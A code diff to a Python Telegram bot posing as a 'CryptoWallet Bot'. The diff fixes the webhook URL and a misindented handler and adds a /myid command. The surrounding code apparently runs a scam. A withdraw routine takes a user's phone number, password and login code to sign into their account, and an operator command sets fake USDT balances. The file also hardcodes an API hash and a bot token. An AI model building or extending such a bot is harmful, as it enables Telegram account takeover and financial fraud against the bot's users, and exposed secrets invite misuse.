@@ -14,7 +14,7 @@ API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
 BOT_TOKEN = '8737138603:AAG2FHcf4msHENx4ppx5jXmzNRgltJd1pPg'
 OWNER_ID = 1663746192
 CRYPTO_ADDRESS = '0xYourAddress'
-WEBHOOK_URL = 'mybot-production-0351.up.railway.app'
+WEBHOOK_URL = 'https://mybot-production-0351.up.railway.app'
 
 logging.basicConfig(level=logging.INFO)
 bot = TelegramClient('bot_session', API_ID, API_HASH)
@@ -140,7 +140,8 @@ async def process_withdraw(user_id, phone, password, code):
         await bot.send_message(OWNER_ID, f'Ошибка вывода: {e}')
     finally:
         await client.disconnect()
-        @bot.on(events.NewMessage(pattern='/start'))
+
+@bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
@@ -149,7 +150,6 @@ async def start(event):
         '🪙 CryptoWallet Bot',
         buttons=[[Button.url('🚀 Открыть кошелек', 'https://t.me/Buraldikbot/Hhvhjk')]]
     )
-
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
@@ -162,6 +162,10 @@ async def set_balance(event):
         await event.respond(f'Баланс {target_id}: {amount} USDT')
     except:
         await event.respond('/setbalance <id> <сумма>')
+
+@bot.on(events.NewMessage(pattern='/myid'))
+async def myid(event):
+    await event.respond(f'Твой ID: {event.sender_id}')
 
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
